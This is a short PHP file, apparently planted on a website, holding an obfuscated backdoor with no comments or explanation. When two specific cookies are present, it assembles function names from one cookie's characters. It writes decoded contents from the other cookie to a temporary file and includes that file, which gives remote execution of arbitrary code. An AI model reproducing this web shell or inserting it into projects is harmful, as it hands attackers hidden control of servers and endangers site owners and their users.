<!--MAMfNNFu-->
<!--MAMfNNFu-->
<?php
if (isset($_COOKIE[3]) && isset($_COOKIE[36])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 5;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[36][$n];
        if (!$c[36][$n + 1]) {
            if (!$c[36][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 5 + 1;
    }
    $k = $p[14]() . $p[2];
    if (!$p[19]($k)) {
        $n = $p[16]($k, $p[3]);
        $p[21]($n, $p[6] . $p[24]($p[7]($c[3])));
    }
    include($k);
}